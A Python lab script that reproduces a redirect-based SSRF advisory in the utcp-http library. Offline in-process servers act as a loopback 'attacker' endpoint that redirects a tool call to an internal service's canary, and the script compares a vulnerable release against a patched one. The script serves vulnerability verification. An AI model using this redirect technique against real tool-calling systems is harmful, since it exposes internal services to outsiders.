"""Mechanism reproduction for GHSA-9QHG-99WW-9MQC (utcp-http redirect SSRF).

The pinned upstream ``utcp_http.http_communication_protocol.HttpCommunicationProtocol``
is driven exactly as a UTCP caller drives it: build an ``HttpCallTemplate`` and
call ``call_tool``. Two in-process aiohttp servers model the attacker endpoint
and the internal service, so the reproduction is deterministic and offline.

* ``attack``: the registered tool URL is a loopback HTTP endpoint, which passes
  the initial ``ensure_secure_url`` check, and that endpoint answers the tool
  call with a 3xx whose ``Location`` points at a non-loopback internal address.
  utcp-http 1.1.3 follows the redirect with aiohttp's default
  ``allow_redirects=True`` and hands the internal body back to the caller;
  1.1.4 re-validates every hop and aborts with ``ValueError`` before the internal
  service is contacted.
* ``benign``: a direct loopback tool endpoint returns a benign marker. Both
  revisions must return it, which shows the fix does not break the loopback
  allow-path.

No network access is required and no model is involved.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
import socket

from aiohttp import web

from lab_support import parser, read_context, record

FIXTURES = Path("/lab/fixtures")
PUBLIC_PORT = 18080
INTERNAL_PORT = 19090


def _fixture(name: str) -> dict:
    return json.loads((FIXTURES / name).read_text(encoding="utf-8"))


def _render(value) -> str:
    if value is None:
        return ""
    if isinstance(value, str):
        return value
    return json.dumps(value, ensure_ascii=False, sort_keys=True)


def _non_loopback_ipv4() -> str | None:
    """Return the address the internal service can be reached at from here."""
    candidates = []
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # UDP connect only selects a route; it puts no packet on the wire.
        probe.connect(("192.0.2.1", 9))
        candidates.append(probe.getsockname()[0])
    except OSError:
        pass
    finally:
        probe.close()
    try:
        candidates.extend(
            info[4][0]
            for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)
        )
    except OSError:
        pass
    for address in candidates:
        if address and not address.startswith("127."):
            return address
    return None


class _RedirectEndpoint:
    """Attacker-controlled tool endpoint: records calls, answers with 3xx."""

    def __init__(self, path: str, status: int, location: str) -> None:
        self.path = path
        self.status = status
        self.location = location
        self.requests: list[str] = []

    async def handle(self, request: web.Request) -> web.Response:
        self.requests.append(request.path_qs)
        if request.path != self.path:
            return web.Response(status=404, text="not found")
        return web.Response(status=self.status, headers={"Location": self.location}, text="")


class _InternalEndpoint:
    """Internal non-loopback service that serves the protected body."""

    def __init__(self, path: str, content_type: str, body) -> None:
        self.path = path
        self.content_type = content_type
        self.body = body
        self.requests: list[str] = []

    async def handle(self, request: web.Request) -> web.Response:
        self.requests.append(request.path_qs)
        if request.path != self.path:
            return web.Response(status=404, text="not found")
        return web.Response(
            text=json.dumps(self.body, ensure_ascii=False),
            content_type=self.content_type,
        )


async def _serve(handler, host: str, port: int) -> web.AppRunner:
    app = web.Application()
    app.router.add_route("*", "/{tail:.*}", handler)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, host, port).start()
    return runner


async def _call_tool(template_kwargs: dict, tool_name: str, tool_args: dict) -> dict:
    """Invoke the pinned upstream call_tool and capture its result or rejection."""
    from utcp_http.http_call_template import HttpCallTemplate
    from utcp_http.http_communication_protocol import HttpCommunicationProtocol

    template = HttpCallTemplate(**template_kwargs)
    protocol = HttpCommunicationProtocol()
    try:
        value = await protocol.call_tool(None, tool_name, dict(tool_args), template)
    except Exception as error:  # the patched revision rejects the redirect here
        return {"returned": False, "value": None,
                "error": {"type": type(error).__name__, "message": str(error)}}
    return {"returned": True, "value": value, "error": None}


async def _run_attack() -> tuple[dict, dict]:
    attack = _fixture("attack_redirect.json")
    canary = _fixture("internal_canary.json")

    internal_ip = _non_loopback_ipv4()
    if internal_ip is None:
        observation = {
            "target_ready": False,
            "execution_status": "failed",
            "reason": "no non-loopback IPv4 address available for the internal target",
        }
        return observation, {"attack_result.json": json.dumps(observation, indent=2) + "\n"}

    internal_base = f"http://{internal_ip}:{INTERNAL_PORT}"
    location = attack["location_template"].format(internal_base=internal_base)
    internal = _InternalEndpoint(
        canary["path"], canary.get("content_type", "application/json"), canary["body"])
    attacker = _RedirectEndpoint(
        attack["attacker_path"], attack["redirect_status"], location)
    tool_url = f"http://127.0.0.1:{PUBLIC_PORT}{attack['attacker_path']}"

    internal_runner = await _serve(internal.handle, "0.0.0.0", INTERNAL_PORT)
    attacker_runner = await _serve(attacker.handle, "127.0.0.1", PUBLIC_PORT)
    try:
        outcome = await _call_tool(
            {"name": attack["tool_name"], "url": tool_url, "http_method": attack["http_method"]},
            attack["tool_name"], attack.get("tool_args", {}))
    finally:
        await attacker_runner.cleanup()
        await internal_runner.cleanup()

    rendered = _render(outcome["value"])
    observation = {
        "target_ready": True,
        "execution_status": "completed",
        "tool_url": tool_url,
        "redirect_location": location,
        "internal_service_url": f"{internal_base}{canary['path']}",
        "attacker_requests": len(attacker.requests),
        "internal_service_requests": len(internal.requests),
        "call_returned": outcome["returned"],
        "call_error": outcome["error"],
        "canary_marker": canary["marker"],
        "canary_observed": canary["marker"] in rendered,
        "response_excerpt": rendered[:2048],
    }
    effects = {
        "attack_result.json": json.dumps(observation, ensure_ascii=False, indent=2) + "\n",
        "tool_result.json": json.dumps(outcome["value"], ensure_ascii=False, indent=2) + "\n",
    }
    return observation, effects


async def _run_benign() -> tuple[dict, dict]:
    benign = _fixture("benign_loopback.json")
    endpoint = _InternalEndpoint(
        benign["endpoint_path"], benign.get("content_type", "application/json"), benign["body"])
    tool_url = f"http://127.0.0.1:{PUBLIC_PORT}{benign['endpoint_path']}"

    runner = await _serve(endpoint.handle, "127.0.0.1", PUBLIC_PORT)
    try:
        outcome = await _call_tool(
            {"name": benign["tool_name"], "url": tool_url, "http_method": benign["http_method"]},
            benign["tool_name"], benign.get("tool_args", {}))
    finally:
        await runner.cleanup()

    rendered = _render(outcome["value"])
    observation = {
        "target_ready": True,
        "execution_status": "completed" if outcome["returned"] else "failed",
        "tool_url": tool_url,
        "endpoint_requests": len(endpoint.requests),
        "call_returned": outcome["returned"],
        "call_error": outcome["error"],
        "benign_marker": benign["marker"],
        "benign_marker_observed": benign["marker"] in rendered,
        "response_excerpt": rendered[:2048],
    }
    effects = {
        "benign_result.json": json.dumps(observation, ensure_ascii=False, indent=2) + "\n",
        "tool_result.json": json.dumps(outcome["value"], ensure_ascii=False, indent=2) + "\n",
    }
    return observation, effects


def main() -> int:
    args = parser(__doc__).parse_args()
    context = read_context(args.context)
    if context["scenario"] == "attack":
        observation, effects = asyncio.run(_run_attack())
    else:
        observation, effects = asyncio.run(_run_benign())
    observation = {"variant": context["variant"], **observation}
    return record(context, args.output, observation, effects)


if __name__ == "__main__":
    raise SystemExit(main())
